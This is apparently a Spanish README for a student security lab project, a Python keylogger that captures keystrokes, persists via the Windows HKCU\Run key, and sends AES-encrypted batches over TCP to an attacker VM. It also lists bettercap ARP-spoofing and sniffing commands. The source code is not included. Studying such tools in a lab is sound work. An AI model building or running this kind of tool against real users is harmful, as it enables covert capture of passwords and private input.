# KeyStealer — Proyecto Unidad 2 Seguridad Informática

Keylogger educativo desarrollado en entorno virtualizado controlado.
Todo el desarrollo y las pruebas se realizan exclusivamente en máquinas virtuales propias.

---

## Topología del entorno

```
┌─────────────────────────────┐         ┌─────────────────────────────┐
│     Máquina Víctima         │         │     Máquina Atacante        │
│     Windows (Host)          │         │     Parrot OS (VM)          │
│                             │  TCP    │                             │
│  keylogger.py               │ :4444   │  servidor_atacante.py       │
│  transporte_victima.py      │────────▶│  cifrado.py                 │
│  cifrado.py                 │         │                             │
│  persistencia.py            │         │  [capturado.txt]            │
│                             │         │                             │
│  192.168.11.21              │         │  192.168.11.40              │
└─────────────────────────────┘         └─────────────────────────────┘
                    │                             │
                    └──────────┬──────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Red local (Bridge) │
                    │   192.168.11.0/24    │
                    └─────────────────────┘
```

> **Modo de red requerido**: la VM Parrot debe estar en modo **Bridge**
> para tener IP en la misma subred que el host Windows y acceso a internet.

---

## Estructura del proyecto

```
src/
├── keylogger.py            # Captura, buffer y coordinación (víctima)
├── cifrado.py              # AES-256-GCM encrypt/decrypt (ambas máquinas)
├── transporte_victima.py   # Serialización y envío TCP (víctima)
├── servidor_atacante.py    # Receptor TCP y descifrado (atacante)
└── persistencia.py         # Registro de Windows HKCU\Run (víctima)
```

---

## Requisitos

**Máquina víctima (Windows):**
```powershell
pip install pynput cryptography
```

**Máquina atacante (Parrot OS):**
```bash
pip3 install cryptography
```

---

## Cómo correr el proyecto

### 1. Configurar la IP del atacante

En `transporte_victima.py`, ajustar la IP de la máquina Parrot:

```python
ATTACKER_HOST = "192.168.11.40"  # IP de tu VM Parrot
ATTACKER_PORT = 4444
```

### 2. Iniciar el servidor en Parrot (primero)

```bash
python3 servidor_atacante.py
```

Salida esperada:
```
[*] Escuchando en 0.0.0.0:4444
[*] Guardando en 'capturado.txt'
```

### 3. Correr el keylogger en Windows

```powershell
python keylogger.py
```

Salida esperada:
```
[*] Persistencia ya instalada.
[*] Keylogger iniciado. Presiona ESC para detener.
```

### 4. Detener el keylogger

Presionar `ESC` — el buffer hace flush final antes de cerrar.

---

## Configuración

Todas las constantes configurables están en `keylogger.py`:

| Constante | Valor por defecto | Descripción |
|---|---|---|
| `BUFFER_MAX` | `50` | Teclas antes de flush por tamaño |
| `FLUSH_INTERVAL` | `5.0` | Segundos entre flushes periódicos |
| `LOG_FILE` | `keylog.txt` | Ruta del log local de respaldo |

---

## Flujo de datos

```
Tecla presionada
    │
on_press() → normalize_key()
    │
    ├── logging.info()  →  keylog.txt  (respaldo local)
    │
    └── buffer.add()
            │
      queue.Queue (thread-safe)
            │
      flush (50 teclas ó 5 seg)
            │
      json.dumps(batch)
            │
      AES-256-GCM encrypt()
      nonce (12B) + ciphertext + tag (16B)
            │
      TCP socket → 4444
            │
      ┌─────▼──────────────────┐
      │  servidor_atacante.py  │
      │  recvall() → decrypt() │
      │  json.loads() → print  │
      │  → capturado.txt       │
      └────────────────────────┘
```

---

## Demo MITM (Ejercicio 3)

En la máquina Parrot, con el servidor ya corriendo:

```bash
sudo bettercap -iface enp0s3
```

Dentro de bettercap:
```
set arp.spoof.targets 192.168.11.21
arp.spoof on
set net.sniff.filter tcp port 4444
net.sniff on
```

En Wireshark aplicar el filtro `tcp.port == 4444` y seleccionar
**Follow → TCP Stream** para verificar que el contenido es ilegible
sin la clave AES.

---

## Advertencia

Este proyecto fue desarrollado exclusivamente con fines educativos
en un entorno virtualizado controlado.
Ejecutar este software fuera del entorno autorizado está estrictamente prohibido.